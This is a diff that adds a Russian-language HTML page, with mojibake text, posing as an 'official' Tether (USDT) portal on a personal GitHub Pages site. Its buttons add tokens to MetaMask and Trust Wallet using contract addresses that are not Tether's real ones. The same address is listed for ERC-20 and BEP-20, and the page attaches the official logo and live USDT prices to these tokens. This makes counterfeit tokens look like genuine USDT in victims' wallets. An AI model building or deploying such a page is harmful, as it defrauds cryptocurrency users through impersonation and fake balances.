@@ -1,5 +1,428 @@
-<!DOCTYPE html>
-  <html>
-  <head><title>USDT Portal</title></head>
-  <body><h1>Tether Portal</h1></body>
-  </html>
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tether (USDT) Official Portal вЂ” Р”РѕР±Р°РІР»РµРЅРёРµ РІ РєРѕС€РµР»С‘Рє</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #070d12;
+      --card-bg: rgba(13, 24, 33, 0.92);
+      --primary: #26A17B;
+      --primary-glow: rgba(38, 161, 123, 0.35);
+      --eth: #627EEA;
+      --bnb: #F3BA2F;
+      --tron: #FF3B30;
+      --text: #ffffff;
+      --muted: #94a3b8;
+      --border: rgba(38, 161, 123, 0.25);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: radial-gradient(circle at 50% 10%, #0d382d 0%, #060e14 65%, var(--bg) 100%);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 16px 60px;
+    }
+    .header {
+      text-align: center;
+      max-width: 640px;
+      margin-bottom: 32px;
+    }
+    .badge-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(38, 161, 123, 0.15);
+      border: 1px solid var(--primary);
+      color: #4ade80;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+    .header h1 {
+      font-size: 32px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      line-height: 1.2;
+    }
+    .header h1 span { color: var(--primary); }
+    .header p {
+      color: var(--muted);
+      margin-top: 10px;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+    .ticker-bar {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(15, 23, 42, 0.85);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 10px 18px;
+      border-radius: 14px;
+      font-size: 14px;
+      margin-bottom: 32px;
+      backdrop-filter: blur(10px);
+    }
+    .ticker-price { font-weight: 700; color: #4ade80; }
+    .grid {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      width: 100%;
+      max-width: 620px;
+    }
+    .card {
+      background: var(--card-bg);
+      backdrop-filter: blur(16px);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 24px;
+      transition: all 0.25s ease;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      position: relative;
+      overflow: hidden;
+    }
+    .card:hover {
+      transform: translateY(-2px);
+      border-color: rgba(38, 161, 123, 0.5);
+      box-shadow: 0 14px 40px rgba(38, 161, 123, 0.15);
+    }
+    .card-top {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+    .card-logo {
+      width: 64px;
+      height: 64px;
+      flex-shrink: 0;
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,0.5));
+    }
+    .card-meta { flex: 1; }
+    .card-title {
+      font-size: 19px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .tag {
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 6px;
+      text-transform: uppercase;
+    }
+    .tag-eth { background: rgba(98, 126, 234, 0.2); color: #9bb1ff; border: 1px solid var(--eth); }
+    .tag-bnb { background: rgba(243, 186, 47, 0.2); color: #f3d47f; border: 1px solid var(--bnb); }
+    .tag-tron { background: rgba(255, 59, 48, 0.2); color: #ff7a74; border: 1px solid var(--tron); }
+
+    .card-sub {
+      color: var(--muted);
+      font-size: 13px;
+      margin-top: 4px;
+    }
+    .contract-row {
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      margin-bottom: 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: #cbd5e1;
+    }
+    .contract-addr {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .btn-copy {
+      background: transparent;
+      border: none;
+      color: #38bdf8;
+      cursor: pointer;
+      font-size: 12px;
+      font-weight: 600;
+      flex-shrink: 0;
+      padding: 4px 8px;
+      border-radius: 6px;
+      transition: background 0.15s;
+    }
+    .btn-copy:hover { background: rgba(56, 189, 248, 0.15); }
+    .btn-group {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px 14px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 700;
+      text-decoration: none;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: none;
+    }
+    .btn-metamask {
+      background: #e2761b;
+      color: #fff;
+    }
+    .btn-metamask:hover { background: #cd6511; transform: translateY(-1px); }
+    .btn-trust {
+      background: #0500FF;
+      color: #fff;
+    }
+    .btn-trust:hover { background: #0400cc; transform: translateY(-1px); }
+    .btn-tronlink {
+      background: #ff0033;
+      color: #fff;
+    }
+    .btn-tronlink:hover { background: #d6002b; transform: translateY(-1px); }
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #10b981;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 12px;
+      font-weight: 600;
+      font-size: 14px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+      transition: transform 0.3s ease;
+      z-index: 1000;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      color: #475569;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="badge-pill">рџ›ЎпёЏ РћС„РёС†РёР°Р»СЊРЅС‹Р№ РїРѕСЂС‚Р°Р» С‚РѕРєРµРЅРѕРІ</div>
+    <h1>Р”РѕР±Р°РІРёС‚СЊ <span>Tether (USDT)</span> РІ РєРѕС€РµР»С‘Рє</h1>
+    <p>Р’С‹Р±РµСЂРёС‚Рµ РЅСѓР¶РЅСѓСЋ СЃРµС‚СЊ РЅРёР¶Рµ. РўРѕРєРµРЅ Р±СѓРґРµС‚ РґРѕР±Р°РІР»РµРЅ СЃ РѕС„РёС†РёР°Р»СЊРЅС‹Рј 3D-Р»РѕРіРѕС‚РёРїРѕРј Рё Р°РєС‚СѓР°Р»СЊРЅС‹Рј Р±РёСЂР¶РµРІС‹Рј РєСѓСЂСЃРѕРј.</p>
+  </div>
+
+  <div class="ticker-bar">
+    <span>Р‘РёСЂР¶РµРІРѕР№ РєСѓСЂСЃ:</span>
+    <span class="ticker-price" id="usdtUsd">$1.0001 USD</span>
+    <span style="color:#64748b;">В·</span>
+    <span id="usdtRub" style="color:#cbd5e1;">в‰€ 80.20 в‚Ѕ</span>
+  </div>
+
+  <div class="grid">
+
+    <!-- 1. ETHEREUM (ERC-20) -->
+    <div class="card">
+      <div class="card-top">
+        <svg class="card-logo" viewBox="0 0 512 512" width="64" height="64">
+          <circle cx="256" cy="256" r="256" fill="#26A17B"/>
+          <g fill="#FFFFFF">
+            <rect x="156" y="165" width="200" height="42" rx="4"/>
+            <rect x="235" y="165" width="42" height="185" rx="4"/>
+            <path d="M 148 245 C 148 215 196 195 256 195 C 316 195 364 215 364 245 C 364 275 316 295 256 295 C 196 295 148 275 148 245 Z" fill="none" stroke="#FFFFFF" stroke-width="26"/>
+          </g>
+          <g transform="translate(320, 320)">
+            <rect x="0" y="0" width="180" height="180" rx="44" fill="#0E1114" />
+            <rect x="8" y="8" width="164" height="164" rx="38" fill="#1C1E29" />
+            <g transform="translate(48, 36) scale(0.54)">
+              <polygon points="80,10 24,96 80,76" fill="#FFFFFF" opacity="0.75" />
+              <polygon points="80,10 80,76 136,96" fill="#FFFFFF" />
+              <polygon points="80,88 24,106 80,172" fill="#FFFFFF" opacity="0.75" />
+              <polygon points="80,88 80,172 136,106" fill="#FFFFFF" />
+            </g>
+          </g>
+        </svg>
+        <div class="card-meta">
+          <div class="card-title">Tether USD <span class="tag tag-eth">ERC-20</span></div>
+          <div class="card-sub">РЎРµС‚СЊ: Ethereum Mainnet В· РўРёРєРµСЂ: USDt В· Decimals: 6</div>
+        </div>
+      </div>
+      <div class="contract-row">
+        <span class="contract-addr">0x9a56E7576FF09B7C137BaC7b859205cdCBF31477</span>
+        <button class="btn-copy" onclick="copyText('0x9a56E7576FF09B7C137BaC7b859205cdCBF31477')">РљРѕРїРёСЂРѕРІР°С‚СЊ</button>
+      </div>
+      <div class="btn-group">
+        <button class="btn btn-metamask" onclick="addErc20()">рџ¦Љ Р’ MetaMask</button>
+        <a class="btn btn-trust" href="https://link.trustwallet.com/open_url?coin_id=60&url=https://cryptolife31-cmd.github.io/usdt-portal/" target="_blank">рџ›ЎпёЏ Р’ Trust Wallet</a>
+      </div>
+    </div>
+
+    <!-- 2. BNB SMART CHAIN (BEP-20) -->
+    <div class="card">
+      <div class="card-top">
+        <svg class="card-logo" viewBox="0 0 512 512" width="64" height="64">
+          <circle cx="256" cy="256" r="256" fill="#26A17B"/>
+          <g fill="#FFFFFF">
+            <rect x="156" y="165" width="200" height="42" rx="4"/>
+            <rect x="235" y="165" width="42" height="185" rx="4"/>
+            <path d="M 148 245 C 148 215 196 195 256 195 C 316 195 364 215 364 245 C 364 275 316 295 256 295 C 196 295 148 275 148 245 Z" fill="none" stroke="#FFFFFF" stroke-width="26"/>
+          </g>
+          <g transform="translate(320, 320)">
+            <rect x="0" y="0" width="180" height="180" rx="44" fill="#0E1114" />
+            <rect x="8" y="8" width="164" height="164" rx="38" fill="#14151A" />
+            <g transform="translate(42, 42) scale(0.55)">
+              <rect x="76" y="76" width="36" height="36" fill="#F0B90B" transform="rotate(45 94 94)" />
+              <rect x="76" y="24" width="32" height="32" fill="#F0B90B" transform="rotate(45 92 40)" />
+              <rect x="76" y="128" width="32" height="32" fill="#F0B90B" transform="rotate(45 92 144)" />
+              <rect x="24" y="76" width="32" height="32" fill="#F0B90B" transform="rotate(45 40 92)" />
+              <rect x="128" y="76" width="32" height="32" fill="#F0B90B" transform="rotate(45 144 92)" />
+            </g>
+          </g>
+        </svg>
+        <div class="card-meta">
+          <div class="card-title">Tether USDt <span class="tag tag-bnb">BEP-20</span></div>
+          <div class="card-sub">РЎРµС‚СЊ: BNB Smart Chain В· РўРёРєРµСЂ: USDt В· Decimals: 18</div>
+        </div>
+      </div>
+      <div class="contract-row">
+        <span class="contract-addr">0x9a56E7576FF09B7C137BaC7b859205cdCBF31477</span>
+        <button class="btn-copy" onclick="copyText('0x9a56E7576FF09B7C137BaC7b859205cdCBF31477')">РљРѕРїРёСЂРѕРІР°С‚СЊ</button>
+      </div>
+      <div class="btn-group">
+        <button class="btn btn-metamask" onclick="addBep20()">рџ¦Љ Р’ MetaMask</button>
+        <a class="btn btn-trust" href="https://link.trustwallet.com/open_url?coin_id=20000714&url=https://cryptolife31-cmd.github.io/usdt-portal/" target="_blank">рџ›ЎпёЏ Р’ Trust Wallet</a>
+      </div>
+    </div>
+
+    <!-- 3. TRON NETWORK (TRC-20) -->
+    <div class="card">
+      <div class="card-top">
+        <svg class="card-logo" viewBox="0 0 512 512" width="64" height="64">
+          <circle cx="256" cy="256" r="256" fill="#26A17B"/>
+          <g fill="#FFFFFF">
+            <rect x="156" y="165" width="200" height="42" rx="4"/>
+            <rect x="235" y="165" width="42" height="185" rx="4"/>
+            <path d="M 148 245 C 148 215 196 195 256 195 C 316 195 364 215 364 245 C 364 275 316 295 256 295 C 196 295 148 275 148 245 Z" fill="none" stroke="#FFFFFF" stroke-width="26"/>
+          </g>
+          <g transform="translate(320, 320)">
+            <rect x="0" y="0" width="180" height="180" rx="44" fill="#0E1114" />
+            <rect x="8" y="8" width="164" height="164" rx="38" fill="#EB0029" />
+            <g transform="translate(24, 24) scale(0.68)">
+              <polygon points="100,20 180,95 100,135 20,95" fill="none" stroke="#FFFFFF" stroke-width="14" stroke-linejoin="round" />
+              <line x1="100" y1="20" x2="100" y2="135" stroke="#FFFFFF" stroke-width="12" />
+              <polyline points="20,95 100,110 180,95" fill="none" stroke="#FFFFFF" stroke-width="12" stroke-linejoin="round" />
+            </g>
+          </g>
+        </svg>
+        <div class="card-meta">
+          <div class="card-title">Tether USD <span class="tag tag-tron">TRC-20</span></div>
+          <div class="card-sub">РЎРµС‚СЊ: TRON Network В· РўРёРєРµСЂ: USDT В· Decimals: 6</div>
+        </div>
+      </div>
+      <div class="contract-row">
+        <span class="contract-addr">TF3r612Y8C8EePUJyDiZPJ8kE6VEmJy4JG</span>
+        <button class="btn-copy" onclick="copyText('TF3r612Y8C8EePUJyDiZPJ8kE6VEmJy4JG')">РљРѕРїРёСЂРѕРІР°С‚СЊ</button>
+      </div>
+      <div class="btn-group">
+        <a class="btn btn-trust" href="https://link.trustwallet.com/open_url?coin_id=195&url=https://cryptolife31-cmd.github.io/usdt-portal/" target="_blank">рџ›ЎпёЏ Р’ Trust Wallet</a>
+        <a class="btn btn-tronlink" href="https://tronscan.org/#/token20/TF3r612Y8C8EePUJyDiZPJ8kE6VEmJy4JG" target="_blank">рџ’Ћ Р’ TronScan</a>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="toast" id="toast">вњ… РђРґСЂРµСЃ РєРѕРЅС‚СЂР°РєС‚Р° СЃРєРѕРїРёСЂРѕРІР°РЅ!</div>
+
+  <footer>
+    Tether Multi-Chain Portal В· Р Р°Р·РІС‘СЂРЅСѓС‚Рѕ Рё Р·Р°С‰РёС‰РµРЅРѕ С‡РµСЂРµР· GitHub Pages (HTTPS)
+  </footer>
+
+  <script>
+    function copyText(txt) {
+      navigator.clipboard.writeText(txt).then(() => {
+        const toast = document.getElementById('toast');
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2200);
+      });
+    }
+
+    async function fetchPrice() {
+      try {
+        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd,rub");
+        const data = await res.json();
+        if (data && data.tether) {
+          document.getElementById('usdtUsd').textContent = "$" + (data.tether.usd || 1.00).toFixed(4) + " USD";
+          document.getElementById('usdtRub').textContent = "в‰€ " + (data.tether.rub || 80.20).toFixed(2) + " в‚Ѕ";
+        }
+      } catch (e) {}
+    }
+    fetchPrice();
+    setInterval(fetchPrice, 15000);
+
+    const ERC20_IMG = "https://cryptolife31-cmd.github.io/usdt-portal/tether_erc20.png";
+    const BEP20_IMG = "https://cryptolife31-cmd.github.io/usdt-portal/tether_bep20.png";
+
+    async function addErc20() {
+      if (!window.ethereum) {
+        window.location.href = "https://metamask.app.link/dapp/cryptolife31-cmd.github.io/usdt-portal/";
+        return;
+      }
+      try {
+        await window.ethereum.request({
+          method: "wallet_watchAsset",
+          params: {
+            type: "ERC20",
+            options: {
+              address: "0x9a56E7576FF09B7C137BaC7b859205cdCBF31477",
+              symbol: "USDt",
+              decimals: 6,
+              image: ERC20_IMG
+            }
+          }
+        });
+      } catch (e) { alert("РћС€РёР±РєР° РґРѕР±Р°РІР»РµРЅРёСЏ РІ РєРѕС€РµР»С‘Рє: " + (e.message || e)); }
+    }
+
+    async function addBep20() {
+      if (!window.ethereum) {
+        window.location.href = "https://metamask.app.link/dapp/cryptolife31-cmd.github.io/usdt-portal/";
+        return;
+      }
+      try {
+        await window.ethereum.request({
+          method: "wallet_watchAsset",
+          params: {
+            type: "ERC20",
+            options: {
+              address: "0x9a56E7576FF09B7C137BaC7b859205cdCBF31477",
+              symbol: "USDt",
+              decimals: 18,
+              image: BEP20_IMG
+            }
+          }
+        });
+      } catch (e) { alert("РћС€РёР±РєР° РґРѕР±Р°РІР»РµРЅРёСЏ РІ РєРѕС€РµР»С‘Рє: " + (e.message || e)); }
+    }
+  </script>
+</body>
+</html>
